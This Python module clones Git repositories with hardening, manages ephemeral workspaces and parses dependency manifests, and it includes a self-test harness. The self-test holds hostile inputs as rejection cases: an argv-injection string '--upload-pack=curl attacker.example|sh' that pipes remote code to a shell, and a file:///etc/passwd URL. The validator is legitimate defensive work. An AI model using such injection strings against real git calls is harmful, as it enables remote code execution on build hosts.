"""Hardened Git cloner, ephemeral workspace manager, and manifest discovery.

Conforms to SCG-SRS-PHASE-2-2026-REV-2.1 sections 3.2 and COMPONENT-1.1.1/1.1.2.

Security invariants enforced:
    P2-01: URL validation -- strict https scheme, allowlisted hostnames, no embedded
           credentials, port restricted to None/443, argv-injection defence via
           leading-hyphen rejection and '--' terminator in subprocess args.
    P2-02: Workspace size ceiling of 250 MB; raises RepositorySizeExceededError.
    P2-03: Static manifest scope extraction without subprocess execution or live
           environment resolution.
    P2-09: Unlocked manifests flagged with AnalysisCompleteness.UNLOCKED_MANIFEST.
    P2-10: Unconditional workspace deletion via shutil.rmtree in a finally block.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import tempfile
from contextlib import contextmanager
from pathlib import Path
from typing import Dict, Generator, List, Optional, Tuple
from urllib.parse import urlparse

from scg_core.schemas.base import Ecosystem
from scg_core.schemas.ingestion import (
    AnalysisCompleteness,
    ClonedWorkspace,
    ManifestDescriptor,
)

# ---------------------------------------------------------------------------
# Policy constants (P2-01)
# ---------------------------------------------------------------------------

ALLOWED_HOSTS: frozenset[str] = frozenset({"github.com", "gitlab.com", "bitbucket.org"})

_MAX_URL_LENGTH: int = 512
_MAX_STDERR_BYTES: int = 8192  # 8 KB truncation ceiling for hostile build output


# ---------------------------------------------------------------------------
# Custom exceptions
# ---------------------------------------------------------------------------


class GitCloneError(Exception):
    """Raised when repository cloning fails or violates URL/security constraints (P2-01)."""


class ManifestNotFoundError(Exception):
    """Raised when no supported manifest files are detected in the cloned repository."""


class RepositorySizeExceededError(Exception):
    """Raised when the cloned workspace disk usage exceeds the configured ceiling (P2-02)."""


# ---------------------------------------------------------------------------
# URL validation
# ---------------------------------------------------------------------------


def validate_repo_url(raw: str) -> str:
    """Strictly validate a repository URL before passing it to a subprocess.

    Enforces the following invariants (P2-01):
        - Maximum length of 512 characters.
        - Rejection of strings starting with '-' (argv injection defence).
        - Strict 'https' scheme; rejects http, file, git, ssh and bare paths.
        - No embedded username or password credentials.
        - Hostname must be in ALLOWED_HOSTS (github.com, gitlab.com, bitbucket.org).
        - Port must be None (implicit 443) or explicitly 443; all others are rejected.

    Args:
        raw: Untrusted URL string supplied by caller.

    Returns:
        The normalised URL string produced by urlparse.geturl() on success.

    Raises:
        GitCloneError: If any validation invariant is violated.
    """
    if len(raw) > _MAX_URL_LENGTH:
        raise GitCloneError(
            f"Repository URL exceeds maximum allowed length of {_MAX_URL_LENGTH} characters."
        )

    # argv injection defence -- reject any string that begins with a hyphen
    if raw.startswith("-"):
        raise GitCloneError(
            "Repository URL may not begin with '-' (argv injection defence)."
        )

    parsed = urlparse(raw)

    if parsed.scheme != "https":
        raise GitCloneError(
            f"Only https protocol is permitted; received scheme: {parsed.scheme!r}. "
            "Schemes http, file, git, and ssh are strictly forbidden."
        )

    if parsed.username or parsed.password:
        raise GitCloneError(
            "Embedded credentials in repository URL are strictly forbidden "
            "(URL must not contain username or password components)."
        )

    host: str = (parsed.hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        raise GitCloneError(
            f"Hostname {host!r} is not on the configured allowlist: "
            f"{sorted(ALLOWED_HOSTS)}. Only github.com, gitlab.com, and "
            "bitbucket.org are permitted."
        )

    if parsed.port not in (None, 443):
        raise GitCloneError(
            f"Non-standard port {parsed.port!r} is forbidden; "
            "only the implicit HTTPS port (443) is permitted."
        )

    return parsed.geturl()


# ---------------------------------------------------------------------------
# Workspace manager
# ---------------------------------------------------------------------------


class GitWorkspaceManager:
    """Manages ephemeral shallow Git checkouts with strict resource bounding.

    All filesystem operations are confined to a temporary directory created by
    tempfile.mkdtemp().  The directory is unconditionally purged inside a
    ``finally`` block regardless of whether cloning, manifest discovery, or any
    downstream stage raises an exception (P2-10).

    Args:
        clone_timeout_seconds: Hard wall-clock timeout for the git-clone subprocess.
        max_repo_mb: Maximum permitted workspace size in mebibytes (P2-02).
    """

    MAX_STDERR_BYTES: int = _MAX_STDERR_BYTES

    def __init__(
        self,
        clone_timeout_seconds: float = 30.0,
        max_repo_mb: int = 250,
    ) -> None:
        self.clone_timeout_seconds = clone_timeout_seconds
        self.max_repo_mb = max_repo_mb

    @contextmanager
    def create_ephemeral_workspace(
        self,
        repo_url: str,
        scan_id: str,
    ) -> Generator[ClonedWorkspace, None, None]:
        """Context manager that clones *repo_url* into a temporary workspace.

        The workspace is guaranteed to be purged on exit -- whether normal or
        exceptional -- via ``shutil.rmtree`` in a ``finally`` block (P2-10).

        Args:
            repo_url: Remote repository URL (validated against ALLOWED_HOSTS).
            scan_id: Unique scan job identifier used to name the temp directory.

        Yields:
            A :class:`ClonedWorkspace` snapshot valid for the duration of the
            ``with`` block.

        Raises:
            GitCloneError: URL validation failure or non-zero clone exit code.
            RepositorySizeExceededError: Workspace exceeds ``max_repo_mb`` (P2-02).
            ManifestNotFoundError: No supported manifests found after cloning.
        """
        validated_url: str = validate_repo_url(repo_url)
        temp_dir: str = tempfile.mkdtemp(prefix=f"scg_workspace_{scan_id}_")
        temp_path: Path = Path(temp_dir)

        try:
            # Shallow clone with maximum subprocess isolation (COMPONENT-1.1.1)
            cmd: List[str] = [
                "git",
                "-c", "protocol.allow=never",
                "-c", "protocol.https.allow=always",
                "-c", "core.hooksPath=/dev/null",
                "-c", "core.symlinks=false",
                "clone",
                "--depth=1",
                "--single-branch",
                "--no-tags",
                "--no-recurse-submodules",
                "--filter=blob:none",
                "--",          # terminate git option parsing (P2-01 argv defence)
                validated_url,
                str(temp_path),
            ]

            # Sterile execution environment -- no inherited host env vars
            env: Dict[str, str] = {
                "GIT_TERMINAL_PROMPT": "0",
                "GIT_ASKPASS": "/bin/true",
                "GIT_CONFIG_NOSYSTEM": "1",
                "GIT_LFS_SKIP_SMUDGE": "1",
                "HOME": str(temp_path),
                "PATH": "/usr/bin:/bin",
            }

            process = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                env=env,
                timeout=self.clone_timeout_seconds,
                check=False,
                start_new_session=True,  # Isolate process group for signal delivery
            )

            if process.returncode != 0:
                # Truncate stderr to 8 KB to prevent memory exhaustion (P2-11)
                raw_err: str = process.stderr[: self.MAX_STDERR_BYTES].decode(
                    "utf-8", errors="replace"
                )
                raise GitCloneError(
                    f"git clone exited with code {process.returncode}. "
                    f"stderr (truncated to {self.MAX_STDERR_BYTES} bytes): {raw_err}"
                )

            # Enforce size ceiling (P2-02)
            actual_mb: float = self._calculate_dir_size_mb(temp_path)
            if actual_mb > self.max_repo_mb:
                raise RepositorySizeExceededError(
                    f"Repository workspace size {actual_mb:.2f} MB exceeds the "
                    f"configured ceiling of {self.max_repo_mb} MB."
                )

            commit_sha: str = self._resolve_head_sha(temp_path)
            manifests, completeness = self.discover_manifests(temp_path)

            if not manifests:
                raise ManifestNotFoundError(
                    f"No supported manifests (package.json, pyproject.toml, "
                    f"poetry.lock, requirements.txt) found in repository: {repo_url}"
                )

            yield ClonedWorkspace(
                scan_id=scan_id,
                workspace_path=temp_path,
                commit_sha=commit_sha,
                manifests=manifests,
                analysis_completeness=completeness,
            )

        finally:
            # Unconditional purge -- P2-10 deterministic cleanup guarantee
            shutil.rmtree(temp_dir, ignore_errors=True)

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _calculate_dir_size_mb(self, path: Path) -> float:
        """Recursively compute total directory size without following symlinks.

        Args:
            path: Root directory to measure.

        Returns:
            Total size in mebibytes (MiB).
        """
        total: int = 0
        for entry in os.scandir(path):
            if entry.is_file(follow_symlinks=False):
                total += entry.stat(follow_symlinks=False).st_size
            elif entry.is_dir(follow_symlinks=False):
                total += sum(
                    f.stat(follow_symlinks=False).st_size
                    for f in Path(entry.path).rglob("*")
                    if f.is_file(follow_symlinks=False)
                )
        return total / (1024.0 * 1024.0)

    def _resolve_head_sha(self, repo_path: Path) -> str:
        """Resolve the 40-character HEAD commit SHA using git rev-parse.

        Args:
            repo_path: Path to the cloned repository directory.

        Returns:
            40-character lowercase hexadecimal SHA-1 string.

        Raises:
            subprocess.CalledProcessError: If git rev-parse fails.
        """
        cmd = ["git", "-C", str(repo_path), "rev-parse", "HEAD"]
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            check=True,
        )
        return result.stdout.strip()

    # ------------------------------------------------------------------
    # Manifest discovery and scope classification (COMPONENT-1.1.2)
    # ------------------------------------------------------------------

    def discover_manifests(
        self,
        repo_path: Path,
    ) -> Tuple[List[ManifestDescriptor], AnalysisCompleteness]:
        """Inspect *repo_path* and extract all supported manifest descriptors.

        Applies the following classification rules without invoking any subprocess:

        * **NPM**: Detects ``package.json``; parses ``dependencies``,
          ``devDependencies``, ``optionalDependencies``, ``peerDependencies``.
          Flags ``is_locked=False`` and ``UNLOCKED_MANIFEST`` if
          ``package-lock.json`` is absent (P2-09).

        * **PyPI / Poetry**: Detects ``poetry.lock`` + optional ``pyproject.toml``.
          Parses ``[tool.poetry.dependencies]`` as production and
          ``[tool.poetry.group.*.dependencies]`` as development using Python 3.11+
          ``tomllib`` (static TOML, no subprocess).

        * **PyPI / pip**: Detects ``requirements.txt``; checks
          ``requirements-dev.txt``, ``dev-requirements.txt``, and
          ``requirements/dev.txt`` for dev scope.  Flags ``UNLOCKED_MANIFEST``
          (P2-09).

        Args:
            repo_path: Root of the cloned repository workspace.

        Returns:
            A 2-tuple ``(manifests, completeness)`` where *manifests* is a list of
            :class:`ManifestDescriptor` objects and *completeness* is the
            highest-severity :class:`AnalysisCompleteness` status across all
            discovered manifests.

        Raises:
            ManifestNotFoundError: If no supported manifests are found.
        """
        manifests: List[ManifestDescriptor] = []
        completeness: AnalysisCompleteness = AnalysisCompleteness.FULL

        # ---- 1. NPM detection (P2-03) ----------------------------------------
        package_json: Path = repo_path / "package.json"
        if package_json.exists() and package_json.is_file():
            lockfile: Path = repo_path / "package-lock.json"
            is_locked: bool = lockfile.exists() and lockfile.is_file()
            if not is_locked:
                completeness = AnalysisCompleteness.UNLOCKED_MANIFEST

            prod_deps: Dict[str, str] = {}
            dev_deps: Dict[str, str] = {}
            opt_deps: Dict[str, str] = {}
            peer_deps: Dict[str, str] = {}

            try:
                with open(package_json, "r", encoding="utf-8") as fh:
                    pkg_data = json.load(fh)
                prod_deps = {
                    k: str(v) for k, v in pkg_data.get("dependencies", {}).items()
                }
                dev_deps = {
                    k: str(v) for k, v in pkg_data.get("devDependencies", {}).items()
                }
                opt_deps = {
                    k: str(v)
                    for k, v in pkg_data.get("optionalDependencies", {}).items()
                }
                peer_deps = {
                    k: str(v) for k, v in pkg_data.get("peerDependencies", {}).items()
                }
            except (OSError, json.JSONDecodeError):
                # Silently degrade; manifest is still recorded with empty maps
                pass

            manifests.append(
                ManifestDescriptor(
                    ecosystem=Ecosystem.NPM,
                    manifest_path=package_json,
                    lockfile_path=lockfile if is_locked else None,
                    is_locked=is_locked,
                    prod_dependencies=prod_deps,
                    dev_dependencies=dev_deps,
                    optional_dependencies=opt_deps,
                    peer_dependencies=peer_deps,
                )
            )

        # ---- 2. PyPI / Poetry detection (P2-03) ------------------------------
        poetry_lock: Path = repo_path / "poetry.lock"
        pyproject_toml: Path = repo_path / "pyproject.toml"
        requirements_txt: Path = repo_path / "requirements.txt"

        if poetry_lock.exists() and poetry_lock.is_file():
            prod_deps, dev_deps = self._parse_poetry_scopes(pyproject_toml, poetry_lock)
            manifests.append(
                ManifestDescriptor(
                    ecosystem=Ecosystem.PYPI,
                    manifest_path=(
                        pyproject_toml if pyproject_toml.exists() else poetry_lock
                    ),
                    lockfile_path=poetry_lock,
                    is_locked=True,
                    prod_dependencies=prod_deps,
                    dev_dependencies=dev_deps,
                )
            )
        elif requirements_txt.exists() and requirements_txt.is_file():
            # Pip / plain requirements -- always unlocked (P2-09)
            prod_deps, dev_deps = self._parse_requirements_scopes(
                repo_path, requirements_txt
            )
            manifests.append(
                ManifestDescriptor(
                    ecosystem=Ecosystem.PYPI,
                    manifest_path=requirements_txt,
                    lockfile_path=None,
                    is_locked=False,
                    prod_dependencies=prod_deps,
                    dev_dependencies=dev_deps,
                )
            )
            completeness = AnalysisCompleteness.UNLOCKED_MANIFEST

        if not manifests:
            raise ManifestNotFoundError(
                f"No supported manifests (package.json, pyproject.toml, poetry.lock, "
                f"requirements.txt) found in repository root: {repo_path}"
            )

        return manifests, completeness

    # ------------------------------------------------------------------
    # Static ecosystem parsers
    # ------------------------------------------------------------------

    def _parse_poetry_scopes(
        self,
        pyproject_path: Path,
        poetry_lock_path: Path,  # noqa: ARG002  (reserved for future hash extraction)
    ) -> Tuple[Dict[str, str], Dict[str, str]]:
        """Parse dependency scopes from ``pyproject.toml`` using the built-in TOML parser.

        Classifies ``[tool.poetry.dependencies]`` as production and packages in any
        ``[tool.poetry.group.*.dependencies]`` section as development.  No subprocess
        is invoked and no live virtual environment is resolved.

        Args:
            pyproject_path: Path to ``pyproject.toml``.
            poetry_lock_path: Path to ``poetry.lock`` (reserved; not parsed here).

        Returns:
            A 2-tuple ``(prod, dev)`` of ``{name: specifier}`` dictionaries.
        """
        prod: Dict[str, str] = {}
        dev: Dict[str, str] = {}

        if not pyproject_path.exists():
            return prod, dev

        try:
            import tomllib  # Python 3.11+ built-in; no subprocess required

            with open(pyproject_path, "rb") as fh:
                data = tomllib.load(fh)

            tool_poetry = data.get("tool", {}).get("poetry", {})

            # Production: [tool.poetry.dependencies]
            for name, spec in tool_poetry.get("dependencies", {}).items():
                if name.lower() == "python":
                    continue  # Python version constraint is not a dependency
                prod[name] = str(spec) if not isinstance(spec, dict) else "*"

            # Development: [tool.poetry.group.<name>.dependencies]
            for _grp_name, grp_data in tool_poetry.get("group", {}).items():
                for name, spec in grp_data.get("dependencies", {}).items():
                    dev[name] = str(spec) if not isinstance(spec, dict) else "*"

        except Exception:  # noqa: BLE001
            # Silently degrade on any TOML parse error or import failure
            pass

        return prod, dev

    def _parse_requirements_scopes(
        self,
        repo_path: Path,
        main_req: Path,
    ) -> Tuple[Dict[str, str], Dict[str, str]]:
        """Parse pip ``requirements.txt`` files into production and development maps.

        Applies simple specifier extraction without full PEP 508 parsing.  Lines
        beginning with ``-`` (``-r``, ``-c``, ``-e`` includes) are skipped.
        Comments (``#`` suffix) are stripped before processing.

        Args:
            repo_path: Repository root used to locate dev requirements candidates.
            main_req: Path to the primary ``requirements.txt`` file.

        Returns:
            A 2-tuple ``(prod, dev)`` of ``{package_name: raw_specifier}`` dicts.
        """
        def _read_reqs(target: Path) -> Dict[str, str]:
            result: Dict[str, str] = {}
            if not target.exists():
                return result
            for line in target.read_text(encoding="utf-8", errors="replace").splitlines():
                # Strip inline comments
                cleaned = line.strip().split("#")[0].strip()
                # Skip blank lines, option flags, and include directives
                if not cleaned or cleaned.startswith("-"):
                    continue
                # Extract package name by splitting on first version operator
                for sep in ("==", ">=", "<=", "~=", "!=", ">", "<", "@"):
                    if sep in cleaned:
                        pkg_name = cleaned.split(sep)[0].strip()
                        result[pkg_name] = cleaned
                        break
                else:
                    # Bare name without version constraint
                    result[cleaned] = cleaned
            return result

        prod: Dict[str, str] = _read_reqs(main_req)

        # Check standard dev-requirements file conventions
        dev_candidates: List[str] = [
            "requirements-dev.txt",
            "dev-requirements.txt",
            "requirements/dev.txt",
        ]
        dev: Dict[str, str] = {}
        for candidate in dev_candidates:
            cand_path = repo_path / candidate
            if cand_path.exists() and cand_path.is_file():
                dev.update(_read_reqs(cand_path))
                break  # Use first match only

        return prod, dev


# ---------------------------------------------------------------------------
# Self-Test  (INGEST-TC-01 workspace purging, INGEST-TC-02 URL validation)
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import sys
    import tempfile as _tempfile

    print("Executing verification harness for scg_core/ingestion/git_worker.py ...")

    # ===========================================================================
    # INGEST-TC-02: URL Validation & Argv Injection Defence (P2-01)
    # ===========================================================================
    print("\n-- INGEST-TC-02: validate_repo_url --")

    # Argv injection: strings beginning with '-'
    _rejected = [
        ("-u", "argv injection"),
        ("--upload-pack=curl attacker.example|sh", "argv injection"),
    ]
    for bad_url, expected_fragment in _rejected:
        try:
            validate_repo_url(bad_url)
            raise AssertionError(f"Should have rejected: {bad_url!r}")
        except GitCloneError as exc:
            assert expected_fragment.lower() in str(exc).lower(), (
                f"Expected fragment {expected_fragment!r} in error: {exc}"
            )
    print("OK [TC-02-1/5] Argv injection strings correctly rejected.")

    # Forbidden schemes
    for bad_scheme in ("file:///etc/passwd", "git://github.com/org/repo", "http://github.com/org/repo", "ssh://github.com/org/repo"):
        try:
            validate_repo_url(bad_scheme)
            raise AssertionError(f"Should have rejected scheme in: {bad_scheme!r}")
        except GitCloneError as exc:
            assert "https" in str(exc).lower(), f"Unexpected error message: {exc}"
    print("OK [TC-02-2/5] Forbidden schemes (file, git, http, ssh) correctly rejected.")

    # Embedded credentials
    try:
        validate_repo_url("https://user:token@github.com/org/repo")
        raise AssertionError("Should have rejected embedded credentials")
    except GitCloneError as exc:
        assert "credential" in str(exc).lower() or "embedded" in str(exc).lower(), str(exc)
    print("OK [TC-02-3/5] Embedded credentials correctly rejected.")

    # Non-allowlisted hostname
    try:
        validate_repo_url("https://internal.corp.local/org/repo")
        raise AssertionError("Should have rejected non-allowlisted host")
    except GitCloneError as exc:
        assert "allowlist" in str(exc).lower() or "not on" in str(exc).lower(), str(exc)
    print("OK [TC-02-4/5] Non-allowlisted hostname correctly rejected.")

    # Valid URL accepted
    valid = "https://github.com/expressjs/express"
    result = validate_repo_url(valid)
    assert result == valid, f"Expected {valid!r}, got {result!r}"
    print("OK [TC-02-5/5] Valid GitHub HTTPS URL accepted and returned unchanged.")

    # ===========================================================================
    # INGEST-TC-01: Workspace Purging on Clone Failure (P2-10)
    # ===========================================================================
    print("\n-- INGEST-TC-01: Ephemeral workspace cleanup on failure --")

    created_paths: list[Path] = []
    _real_mkdtemp = _tempfile.mkdtemp

    def _spy_mkdtemp(*args, **kwargs):  # type: ignore[no-untyped-def]
        p = _real_mkdtemp(*args, **kwargs)
        created_paths.append(Path(p))
        return p

    # Monkey-patch tempfile.mkdtemp inside this module's namespace
    import scg_core.ingestion.git_worker as _self_module
    _self_module.tempfile.mkdtemp = _spy_mkdtemp  # type: ignore[attr-defined]

    manager = GitWorkspaceManager(clone_timeout_seconds=5.0)
    # This URL passes validation but will fail to clone (repo does not exist)
    bad_clone_url = "https://github.com/scg-test-nonexistent-org-2026/totally-not-a-real-repo.git"

    try:
        with manager.create_ephemeral_workspace(bad_clone_url, scan_id="tc01-purge"):
            pass
    except (GitCloneError, Exception):
        pass  # Expected -- clone will fail

    _self_module.tempfile.mkdtemp = _real_mkdtemp  # restore

    assert len(created_paths) >= 1, "Spy did not capture any mkdtemp calls"
    for p in created_paths:
        assert not p.exists(), (
            f"WORKSPACE LEAK DETECTED: directory {p} still exists after context exit (P2-10 violation)"
        )
    print(f"OK [TC-01-1/1] Workspace {created_paths[0]} purged after clone failure (P2-10 confirmed).")

    # ===========================================================================
    # INGEST-TC-03: discover_manifests with synthetic fixture directory
    # ===========================================================================
    print("\n-- INGEST-TC-03: discover_manifests fixture test --")

    import json as _json

    with _tempfile.TemporaryDirectory(prefix="scg_manifest_test_") as tmpdir:
        root = Path(tmpdir)

        # Write a minimal package.json with no lockfile
        pkg = {"dependencies": {"express": "^4.18.0"}, "devDependencies": {"jest": "^29.0.0"}}
        (root / "package.json").write_text(_json.dumps(pkg), encoding="utf-8")

        wm = GitWorkspaceManager()
        manifests, completeness = wm.discover_manifests(root)

        assert len(manifests) == 1
        assert manifests[0].ecosystem == Ecosystem.NPM
        assert manifests[0].is_locked is False
        assert manifests[0].prod_dependencies == {"express": "^4.18.0"}
        assert manifests[0].dev_dependencies == {"jest": "^29.0.0"}
        assert completeness == AnalysisCompleteness.UNLOCKED_MANIFEST
        print("OK [TC-03-1/2] NPM unlocked manifest classified correctly.")

        # Add lockfile and verify is_locked flips
        (root / "package-lock.json").write_text("{}", encoding="utf-8")
        manifests2, completeness2 = wm.discover_manifests(root)
        assert manifests2[0].is_locked is True
        # With a lockfile present, NPM completeness should be FULL (no pypi unlocked)
        assert completeness2 == AnalysisCompleteness.FULL
        print("OK [TC-03-2/2] NPM locked manifest (with package-lock.json) classified correctly.")

    print("\nSUCCESS: scg_core/ingestion/git_worker.py verified")
